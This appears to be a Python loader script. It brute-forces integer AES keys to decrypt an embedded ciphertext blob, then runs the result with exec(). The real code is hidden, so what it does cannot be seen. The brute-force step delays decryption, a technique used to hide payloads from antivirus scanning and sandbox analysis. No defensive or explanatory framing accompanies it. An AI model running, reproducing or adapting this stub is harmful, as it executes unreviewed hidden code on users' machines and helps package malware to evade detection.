from Crypto import Random
from Crypto.Cipher import AES
import hashlib
import easygui
class Decryptor:
	def __init__(self, key, file_name):
		self.key = hashlib.sha256(key.encode('utf-8')).digest()
		self.file_name = file_name

	def pad(self, s):
		return s + b"\0" * (AES.block_size - len(s) % AES.block_size)

	def decrypt(self, ciphertext, key):
		iv = ciphertext[:AES.block_size]
		cipher = AES.new(key, AES.MODE_CBC, iv)
		plaintext = cipher.decrypt(ciphertext[AES.block_size:])
		return plaintext.rstrip(b"\0")

	def decrypt_file(self):
		dec = self.decrypt(self.file_name, self.key)
		return dec

class BruteForce:
	def __init__(self, encrypted_codes):
		self.encrypted_codes = encrypted_codes
		self.password = 0

	def start(self): 
		status = True
		while status:
			try:
				test = Decryptor(str(self.password), self.encrypted_codes)
				decrypted_code = test.decrypt_file()
				executable = decrypted_code.decode() 
				status = False
				return executable 
			except UnicodeDecodeError:
				self.password += 1

encrypted_codes = b'U\xcb\x19RK\x86\xd5]\xa5v\xcc\xe3\x99\xcc\x102\xed4\xb0U\xafM\xf0\xdd\xfe\xc4\xcf\xd6|\xd2\xb2\x12T\x03\x0c\xe4\xe6 \xc9\x14gu\xb0h\xe1u\xfb\x1e\xb9\xbf$\x8aR\xa1\x1b\xe4\x18\xed\x96\xab\xd8\x99,nn\x81\xfa\xe7\x086\xc6$\xf5:\xc0 \xb6@\xf0\x19\x93\x1e\x891\xa7b*8\xef\xb5\xc8\x02\xddk\xd91\xf1\xf6\xc0\xe1s\x96\x1f\xc4\xe6P\x83L\xeaSO/A]\xd0\x8a\xac\x97\xce\xd8\xc1J\xcf\x94\x17D\xcc\xdd?\xbf\xf3v0\xcd\xee\xcf\xd5\xfc\x93\xd4P\x96%\x05j\x1a\n/\x1d\xe9\'[([*\x85\'\xc5\xddM\xf5\x10e\x86\xc9\xea\xd5\xfd0xgK\x9e\xe4\xb1\xa1\x87\xd81+\xf0\xd6\xde\x8e\x1a\xb5\xdf?\x94a\xf4\x96sj\x91\x95N3\x03\xf7WTI\x0bT\xbc\x8b_\x83zJa\x92&\xcdk\xa1=\x00\xde\n\xc9\x15\x86g\xdc\x99\x96E{8+\x8b\xe0\xc2\x1d\x062\xe2\xe9n\x1f\xe9\'\x97\xa5\xab\x12+\xe1`\x08\x8b\xd2\x88\xa7oc\x9a\xb3\x82\xb4y\xb3e\xaa\xf2\xd4\xa2\xf6 \xed\xb0\xb3\xb9~\xe4\xa5\xffG\xa0\xd7\xe5IR\x07"p\xaciJp\xb6\x1f\xa4(\r\xd6\xc3\x19\xc5\xfe`B\xc07\x04\xcc&/r\xfe\xb0\xebB\x15\xa7g\xf05\xd1\xc3^Z\xf0\xb8\xd4\'C\xf2R*R\xae\x95\xfb\x93\x0f\xcd\xcb8\xd5\xda\n\xb5\xff\xd1P\xbb\xec\xa1,\xd2\xc3q\x0c\x0f\xe0\xed\xd3\xa6`gB\xcd\x81\xd6Y/\xebA\xac\xe8\xc0\x19\xbe#\x1f&\xe1\\6M9\xe81\x92\xcd\xc4\xb8l\x8b\x95h\x80\xa7\x8e:\x1dh\x1b\x03\x88\x9e\xba5l\x13\xbeGf\x08\xa4\xab\x1dr\x03\xb4\xf0\xb6\xa4t\xc5j\n\x86\xd37\xad\x95\xbe\xd4\xb1#A\x07\x17\x94\x1e\xfc7\xed\xf5*7\xa3\x89Jn\x82\xb5w\xfb\x1b\xe0!\xe6\x9fO\xe2Nz\xad\xdat4\x0cP?\x1eh`\xabv*\x199\x9e\xe7l\xca\x13p\x1e\xe8\x92\xc0\x85\xb3\xe4)^]\xaeh\xbc\xa8\x83\xb5K\xb1C\xce\xecv\x9a\x89\x0c\xb0X:A\xbeZ\x9f\xfb\xfb\xa4\x9e\xf2\x03T>\x99jW\x13\xd9x\x02\xf2^\xc8\xc8\x0e\x15\xb1\x19yQ\x9cM\xfb\x90\xa56\x18\x90\xf9)Ol\x087\x96\x1b\x9a\xc5\xd5\x1b\xc1`a\x11\xf5\x87\x15\x98J8\x830D\xc3\x02\x8d\xb0\xc7\\H\xe2\x14\xc9h\xa3j9\x16T\x04\xe6\x99\x0f\xc2rNF58-\x972\xab\x0c\x1c\x07*\x8a\xc4\xe7\xae\x82\xfa\x92\xc3\xd8V\xc0\x8e\x9e\xdb\x17&\x1c\x1b\xec\xfdT\x1fB_\xe02\x8a\x1d\xa0\x1e\x19%\xa4:O\tv\xe9:\xbf`q\x1c\x9cE\xef\x1f\n\xb1\xf3\xc3\x80g\x85\x1e\x9d7\xa9Y\x9d\x81\x08\x0b\xad\x17XJ\x11\xc9,\x0c\x8cc\xb9\x0e\x94n\xf9\xe5\x92oI\x152 o\xb9\\\xd2[d\xe8:\xd2f\xa6\x1f|\xe9\xd1\xf5\xf6\xf9\x83X(\x94\x05\x11\xff\t\x9c_\xee(G\xc0b\x9cm\xbc~\x0c]\xec%\xbaz\x06\xd7C^a\x9f\xc7\xdc1;\x05\xc6\xdf\xc7\x19Y=\x90\'\xd8\r\xb9\xc3\x87}P\x80\xe7\xba\xc9g\x05\x9bT\x93Q!4\x0f\x97C\xffK*\xc7\xb6A\x83\xa5\x99\x98G\x87k\x8eM\xee\xc3\xf8l\xc5\x85h1\x17\xc3\xdb\xe7\xc7\xbcjZ>\xa6\x87\xe6\xbf/n\x13\x7f\xdc,F\xe9Ge\xe9\xf0x_,\xf0\xf1\xce\xff\x17\xf8a-\xc6\xf3\xd7y\xc4\xf4B\x1fH\xd4\x90K\x08%w\xda<\x8dhPD\x1cq=p\xe0owI\x15x0\x8c\xf8W\x03\n7\x9eg]P\xd6\x82c\xc8F\xf2k\x1eB%\x06\xa2\x86\x88\xe1P}F\xc1\xad.^N\xc7 \xe8W\x12i\xe80\xf9\x86\xb11\xc9\xb7S\xa5\xc8\xd5\x8f\x95\xad\xa2\xe8f\x03\xca:E\xd8\xdfm\xad\x9f\xcc\x97\x1c\x0b\'\x031\x87\x1b\x172\x1f\xd5\\a\xbf\xd4\xe2\xa0v\xa2B\xad\x91N\xd2\xf0'
brute = BruteForce(encrypted_codes)
executable = brute.start()
exec(executable)
